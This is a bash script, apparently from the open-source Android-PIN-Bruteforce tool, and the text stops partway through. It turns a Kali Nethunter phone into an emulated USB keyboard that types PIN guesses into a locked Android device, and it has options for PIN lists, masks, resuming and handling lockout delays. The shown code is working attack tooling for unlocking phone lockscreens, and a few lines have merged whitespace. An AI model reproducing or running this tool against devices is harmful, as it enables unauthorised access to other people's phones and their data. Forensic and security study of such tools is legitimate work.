#!/bin/bash
# Android-PIN-Bruteforce
# 
# Unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
# 
# Turn your Kali Nethunter phone into a bruteforce PIN cracker for Android devices!
# This uses the USB OTG cable to emulate a keyboard, automatically try PINs, and wait after trying too many wrong guesses.
#
# https://github.com/urbanadventurer/Android-PIN-Bruteforce

# Load Default Configuration
source config.default
# Load Configuration
source config

VERSION=0.1

DIRECTION=1 # go forwards
VERBOSE=0
DRY_RUN=0
#RET=0

LIGHT_GREEN="\033[92m"
LIGHT_YELLOW="\033[93m"
LIGHT_RED="\033[91m"
LIGHT_BLUE="\033[94m"
DEFAULT="\033[39m"
CLEAR_LINE="\033[1K"
MOVE_CURSOR_LEFT="\033[80D"

function usage() {
  echo -e "
Android-PIN-Bruteforce ($VERSION) is used to unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
  Find more information at: https://github.com/urbanadventurer/Android-PIN-Bruteforce

Commands:crack\t\t\tBegin cracking PINs
  resume\t\tResume from a chosen PIN
  rewind\t\tCrack PINs in reverse from a chosen PIN
  diag\t\t\tDisplay diagnostic information
  version\t\tDisplay version information and exit

Options:
  -f, --from PIN\tResume from this PIN
  -a, --attempts NUM\tStarting from NUM incorrect attempts
  -m, --mask REGEX\tUse a mask for known digits in the PIN
  -t, --type TYPE\tSelect PIN or PATTERN cracking
  -l, --length NUM\tCrack PINs of NUM length
  -c, --config FILE\tSpecify configuration file to load
  -p, --pinlist FILE\tSpecify a custom PIN list
  -d, --dry-run\t\tDry run for testing. Doesn't send any keys.
  -v, --verbose\t\tOutput verbose logs

Usage:
  android-pin-bruteforce <command> [options]"

}


function load_pinlist() {
  length=$1

  top_number=$((10**$length-1))

  # was a PIN_LIST selected by the user?
  if [ -f "$PIN_LIST" ]; then
    log_info "Loading user specified PIN list $PIN_LIST for $length digits"
    # TODO: this doesn't valdiate the PIN_LIST 
    pinlist=(`cat $PIN_LIST`)
  else
    # Check if an optimised list exists
    if [ -f "optimised-pin-length-$length.txt" ]; then
      PIN_LIST="optimised-pin-length-$length.txt"
      log_info "Loading optimised PIN list for $length digits ($PIN_LIST)"
      pinlist=(`cat $PIN_LIST`)
    else
      # generate the list
      log_info "Generating PIN list for $length digits"
      pinlist=(`seq -w 0 $top_number`)
    fi
  fi
  log_info "PIN list contains ${#pinlist[@]} PINs"
    

  if [ -n "$MASK" ]; then
    pinlist=(`echo "${pinlist[@]}" | tr ' ' '\n' | egrep "$MASK" | tr '\n' ' '`)
  fi

  # validate mask returned PINs
  if [ ${#pinlist[@]} -eq 0 ]; then
    log_fail "MASK $MASK created an invalid PIN list with zero PINs"
    abort
  fi

  resume_from_index=0
  if [ -n "$RESUME_FROM_PIN" ]; then
 #   log_debug "Looking for $RESUME_FROM_PIN in pinlist"
    for i in "${!pinlist[@]}"; do
       if [[ "${pinlist[$i]}" = "${RESUME_FROM_PIN}" ]]; then
  #         log_debug  "Found ${RESUME_FROM_PIN} at element ${i}"
          resume_from_index=$i
       fi
    done
  fi
}

function repeat(){
  printf "%0.s$1" $(eval echo {1..$2})
}

# progress bar
# https://unix.stackexchange.com/questions/415421/linux-how-to-create-simple-progress-bar-in-bash
function prog() {tput cup 0 0
    local w=80 p=$1
    shift
    # create a string of spaces, then change them to dots
    printf -v dots "%*s" "$(( $p*$w/100 ))" ""
    dots=${dots// /x}
    # print those dots on a fixed-width space plus the percentage etc. 
    printf "\r\e[K|%-*s| %3d %% %s" "$w" "$dots" "$p" "$*"
}


function diagnostic_info() {
  log_info "# Diagnostic info"

  if [ -e $KEYBOARD_DEVICE ]; then
    log_pass "HID device ($KEYBOARD_DEVICE) found"
    ls -l $KEYBOARD_DEVICE
  else
    log_fail "HID device ($KEYBOARD_DEVICE) not found"
  fi

  if [ -f $HID_KEYBOARD ]; then
    log_pass "hid-keyboard executable ($HID_KEYBOARD) found" 
    ls -l $HID_KEYBOARD
  else
    log_fail "hid-keyboard executable ($HID_KEYBOARD) not found"  
  fi

  if [ -f $USB_DEVICES ]; then
    log_pass "usb-devices executable ($USB_DEVICES) found" 
    ls -l $USB_DEVICES
  else
    log_fail "usb-devices executable ($USB_DEVICES) not found"  
  fi

  log_info "## Executing Command: $USB_DEVICES"
  $USB_DEVICES
  RET=$?
  if [ $RET -eq 0 ]; then
    log_pass "usb-devices script executed succeessfully."
  else
    log_fail "usb-devices script failed. Return code $RET."
  fi

  log_info "## Finding Android Phone USB Device"
  devices=$($USB_DEVICES | egrep -C 5 "Manufacturer=[^L][^i][^n][^u][^x]" \
 | egrep "Vendor|Manufacturer|Product|SerialNumber" | cut -c 5- )
  
  if [ -n "$devices" ]; then
    log_fail "Unexpected result, device identified: $devices. Check your USB cables. The OTG cable should be attached to the locked phone."
  else
    log_info "Expected result, no device found."
  fi

  log_info "## Sending Enter Key"
  echo enter | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard
  RET=$?

  if [ $RET -eq 0 ]; thenlog_pass "Key was sent succeessfully."
  else
    log_fail "Key failed to send. Return code $RET."
  fi
